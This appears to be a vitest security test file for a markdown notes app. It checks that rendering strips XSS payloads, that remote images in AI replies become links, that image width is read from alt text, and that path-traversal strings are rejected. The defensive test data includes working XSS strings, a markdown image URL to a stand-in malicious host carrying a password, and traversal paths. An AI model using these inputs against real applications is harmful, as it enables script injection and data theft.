import { describe, expect, it } from "vitest";
import { renderMarkdown, renderNote } from "../src/lib/render";
import { cleanPath } from "../shared/vault";

describe("security", () => {
  it("never renders raw HTML or script links from notes", () => {
    const { html } = renderNote('<img src=x onerror="alert(1)"> <script>alert(1)</script>\n\n[klik](javascript:alert(1)) [[a"><b onmouseover=alert(1)>]]');
    expect(html).not.toMatch(/<img|<script|<b /i);
    expect(html).not.toContain('href="javascript:');
  });

  it("AI replies show remote images as links (no silent data leaks)", () => {
    const html = renderMarkdown("![tajné](https://zly.example/x.png?d=heslo)", { blockRemoteImages: true });
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://zly.example/x.png?d=heslo"');
    // Notes themselves still show remote images.
    expect(renderMarkdown("![obrázek](https://example.com/a.png)")).toContain("<img");
  });

  it("reads image width from the alt text", () => {
    const html = renderMarkdown("![Graf|300](https://example.com/g.png)");
    expect(html).toContain('width="300"');
    expect(html).toContain('alt="Graf"');
  });

  it("refuses paths outside the vault", () => {
    for (const p of ["../tajne.txt", "a/../../b", "..\\..\\Windows\\x", "C:/Windows/x"]) expect(() => cleanPath(p)).toThrow();
    expect(cleanPath("./Projekty//Web.md")).toBe("Projekty/Web.md");
  });
});
